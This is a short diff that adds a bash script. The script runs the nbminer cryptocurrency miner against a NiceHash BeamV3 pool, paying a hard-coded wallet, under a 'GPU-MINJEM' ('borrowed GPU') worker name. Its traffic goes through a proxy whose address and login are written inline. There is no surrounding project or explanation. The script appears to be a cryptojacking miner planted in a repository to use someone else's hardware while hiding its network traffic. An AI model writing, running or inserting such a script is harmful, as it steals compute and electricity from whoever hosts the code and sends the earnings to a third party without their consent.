@@ -1,0 +1,4 @@
+#!/bin/bash
+
+chmod +x nbminer
+./nbminer -a beamv3 -o stratum+tcp://beamv3.eu.nicehash.com:3387 -u 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(echo GPU-MINJEM-$(shuf -i 1000-9999 -n 1)) -proxy nyipkieh:awikwoklu@45.146.89.96:8159
